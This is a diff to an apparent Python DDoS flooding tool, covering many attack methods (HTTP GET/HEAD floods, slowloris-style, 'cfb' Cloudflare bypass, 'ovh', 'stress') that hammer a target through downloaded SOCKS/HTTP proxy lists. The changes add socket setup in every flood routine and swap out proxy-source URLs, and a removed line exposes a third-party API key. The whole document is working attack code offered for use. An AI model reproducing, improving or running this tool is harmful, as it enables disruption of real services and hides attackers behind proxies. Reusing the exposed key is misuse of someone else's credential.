@@ -443,7 +443,7 @@ def dyn(event, socks_type):
     header = Headers("dyn")
     proxy = Choice(proxies).strip().split(":")
     get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + random_data() + "." + target + "\r\n"
-
+    s = socks.socksocket()
     request = get_host + header
     event.wait()
     while time.time() < timer:
@@ -475,6 +475,7 @@ def http(event, socks_type):
     get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -503,6 +504,7 @@ def capb(event, socks_type):
     get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -531,6 +533,7 @@ def ovh(event, socks_type):
     get_host = "HEAD " + path + "/" + str(Intn(1111111111, 9999999999)) + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -558,6 +561,7 @@ def pps(event, socks_type):
     proxy = Choice(proxies).strip().split(":")
     request = Headers("pps")
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -588,6 +592,7 @@ def even(event, socks_type):
     get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -618,6 +623,7 @@ def brust(event, socks_type):
     get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -647,6 +653,7 @@ def cookie(event, socks_type):
     get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -676,6 +683,7 @@ def cfb(event, socks_type):
     get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -785,6 +793,7 @@ def head(event, socks_type):
     head_host = "HEAD " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = head_host + header
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -814,6 +823,7 @@ def null(event, socks_type):
     head_host = "HEAD " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = head_host + header
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -843,6 +853,7 @@ def gsb(event, socks_type):
     head_host = "HEAD " + path + "?q=" + str(Intn(000000000, 999999999)) + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = head_host + header
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -887,6 +898,7 @@ def hit(event, timer):
 def cfbc(event, socks_type):
     request = Headers("cfb")
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -914,6 +926,7 @@ def post(event, socks_type):
     request = Headers("post")
     proxy = Choice(proxies).strip().split(":")
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -941,6 +954,7 @@ def stress(event, socks_type):
     request = Headers("stress")
     proxy = Choice(proxies).strip().split(":")
     event.wait()
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -989,6 +1003,7 @@ def slow(conn, socks_type):
     get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
     header = Headers("get")
     request = get_host + header
+    s = socks.socksocket()
     while time.time() < timer:
         try:
             s = socks.socksocket()
@@ -1019,6 +1034,7 @@ def slow(conn, socks_type):
 def checking(lines, socks_type, ms):
     global nums, proxies
     proxy = lines.strip().split(":")
+    s = socks.socksocket()
     if len(proxy) != 2:
         proxies.remove(lines)
         return
@@ -1105,89 +1121,50 @@ def downloadsocks(choice):
     if choice == "4":
         f = open(out_file, 'wb')
         try:
-            r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
-                             timeout=5)
+            r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4", timeout=30)
             f.write(r.content)
         except:
             pass
         try:
-            r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4", timeout=5)
+            r = requests.get("https://www.proxyscan.io/download?type=socks4", timeout=30)
             f.write(r.content)
         except:
             pass
         try:
-            r = requests.get("https://www.proxyscan.io/download?type=socks4", timeout=5)
-            f.write(r.content)
-        except:
-            pass
-        try:
-            r = requests.get(
-                "https://proxy-daily.com/api/getproxylist?apikey=3Rr6lb-yfeQeotZ2-9M76QI&format=ipport&type=socks4&lastchecked=60",
-                timeout=5)
-            f.write(r.content)
-        except:
-            pass
-        try:
-            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt", timeout=5)
+            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt", timeout=30)
             f.write(r.content)
             f.close()
         except:
             f.close()
-        try:
-
-            req = requests.get("https://www.socks-proxy.net/", timeout=5, headers={"User-Agent", UserAgent}).text
-            part = str(req)
-            part = part.split("<tbody>")
-            part = part[1].split("</tbody>")
-            part = part[0].split("<tr><td>")
-            proxies = ""
-            for proxy in part:
-                proxy = proxy.split("</td><td>")
-                try:
-                    proxies = proxies + proxy[0] + ":" + proxy[1] + "\n"
-                except:
-                    pass
-                out_file = open(out_file, "a")
-                out_file.write(proxies)
-                out_file.close()
-        except:
-            pass
     if choice == "5":
         f = open(out_file, 'wb')
         try:
             r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all",
-                             timeout=5)
+                             timeout=30)
             f.write(r.content)
         except:
             pass
         try:
-            r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5", timeout=5)
-            f.write(r.content)
-            f.close()
-        except:
-            pass
-        try:
-            r = requests.get("https://www.proxyscan.io/download?type=socks5", timeout=5)
+            r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5", timeout=30)
             f.write(r.content)
             f.close()
         except:
             pass
         try:
-            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt", timeout=5)
+            r = requests.get("https://www.proxyscan.io/download?type=socks5", timeout=30)
             f.write(r.content)
+            f.close()
         except:
             pass
         try:
-            r = requests.get(
-                "https://proxy-daily.com/api/getproxylist?apikey=3Rr6lb-yfeQeotZ2-9M76QI&format=ipport&type=socks5&lastchecked=60",
-                timeout=5)
+            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt", timeout=30)
             f.write(r.content)
         except:
             pass
         try:
             r = requests.get(
                 "https://gist.githubusercontent.com/Azuures/1e0cb7a1097c720b4ed2aa63acd82179/raw/97d2d6a11873ffa8ca763763f7a5dd4035bcf95f/fwefnwex",
-                timeout=5)
+                timeout=30)
             f.write(r.content)
             f.close()
         except:
@@ -1196,31 +1173,24 @@ def downloadsocks(choice):
         f = open(out_file, 'wb')
         try:
             r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all",
-                             timeout=5)
+                             timeout=30)
             f.write(r.content)
         except:
             pass
         try:
-            r = requests.get("https://www.proxy-list.download/api/v1/get?type=http", timeout=5)
-            f.write(r.content)
-            f.close()
-        except:
-            pass
-        try:
-            r = requests.get("https://www.proxyscan.io/download?type=http", timeout=5)
+            r = requests.get("https://www.proxy-list.download/api/v1/get?type=http", timeout=30)
             f.write(r.content)
             f.close()
         except:
             pass
         try:
-            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", timeout=5)
+            r = requests.get("https://www.proxyscan.io/download?type=http", timeout=30)
             f.write(r.content)
+            f.close()
         except:
             pass
         try:
-            r = requests.get(
-                "https://proxy-daily.com/api/getproxylist?apikey=3Rr6lb-yfeQeotZ2-9M76QI&format=ipport&type=http&lastchecked=60",
-                timeout=5)
+            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", timeout=30)
             f.write(r.content)
             f.close()
         except:
@@ -1559,7 +1529,7 @@ def makefile(text):
     print('File: ', text)
 
 if __name__ == '__main__':
-    import os, requests, socket, socks, time, random, threading, sys, ssl, datetime, cfscrape, re
+    import os, requests, socket, socks, time, random, threading, sys, ssl, datetime, cfscrape, re, secrets
     from time import sleep
     from icmplib import ping as pig
     from scapy.layers.inet import TCP
@@ -1629,4 +1599,3 @@ if __name__ == '__main__':
         sys.exit()
     except IndexError:
         usge()
-
